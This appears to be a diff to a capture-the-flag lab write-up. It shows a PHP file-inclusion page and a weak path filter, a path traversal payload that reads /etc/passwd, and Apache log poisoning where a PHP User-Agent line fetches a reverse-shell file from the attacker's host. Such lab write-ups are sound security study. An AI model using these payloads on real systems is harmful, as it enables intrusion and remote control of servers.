@@ -124,6 +124,78 @@ With the aid of the encoding filter,we can pass it out in encoded form instead o
 
 ![image](https://github.com/user-attachments/assets/f1c8f735-6a4b-4252-93df-7ede63cd3d86)
 
+### Filters bypass
+
+- Code:
+
+      <!DOCTYPE HTML>
+      <html>
+      
+      <head>
+          <title>INCLUDE</title>
+          <h1>Test Page. Not to be Deployed</h1>
+       
+          </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
+              <?php
+      
+                  //FLAG: thm{explo1t1ng_lf1}
+      
+                  function containsStr($str, $substr) {
+                      return strpos($str, $substr) !== false;
+                  }
+                  if(isset($_GET["view"])){
+                  if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
+                      include $_GET['view'];
+                  }else{
+      
+                      echo 'Sorry, Thats not allowed';
+                  }
+              }
+              ?>
+          </div>
+      </body>
+      
+      </html>
+
+- Filter
+
+      if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing'))
+
+  - `!containsStr($_GET['view'], '../..')` checks if `../..` is in the parameter view and the other `containsStr($_GET['view'], '/var/www/html/development_testing')` checks if directory "/var/www/html/development_testing" is in the file path.
+
+- I bypassed it by adding `./` after `../`.The characters `./` tells linux to check the current directory for `..` which in turns go up a directory.Example:
+
+ ![image](https://github.com/user-attachments/assets/4ca6405e-8777-4757-a3a6-2a3e7aa1b37a)
+
+- In the case of the the target,we have to go up 4 directories to read sensitive files.The payload below will read the `/etc/passwd` file.
+
+  Payload-:```/var/www/html/development_testing/.././.././.././.././.././etc/passwd```
+
+![image](https://github.com/user-attachments/assets/c43c51a9-43c8-4c1f-8880-86061e2d247c)
+
+### Poisoning apache log gain RCE
+
+- Apache server's log can be found in `/var/log/apache2/access.log`.
+
+![image](https://github.com/user-attachments/assets/1263e347-cbee-485a-baff-86f313caae88)
+
+- Adding php code the `User-Agent` header will reflect in the log file and execute as php code. I got an idea to exploit it from this [github's repo](https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet)
+
+- The code `<?php file_put_contents('shell.php',file_get_contents('http://<local_ip>:<PORT>/shell-php-rev.php')) ?>` uses the file_get_contents() to get the content of the file hosted on our http server.The file's contents is written to shell.php. The file path should be `/var/www/html/development_testing/shell.php` because we have write access to `development_testing`.
+
+![image](https://github.com/user-attachments/assets/65656a09-8f1f-42c0-9b8b-6db48a95b49d)
+
+- Shell access
+
+![image](https://github.com/user-attachments/assets/45aa405e-aeb6-4026-b19b-4589acdbe6af)
+
+### Initial Foothold
+
+
+
+
+
+
 
 
 
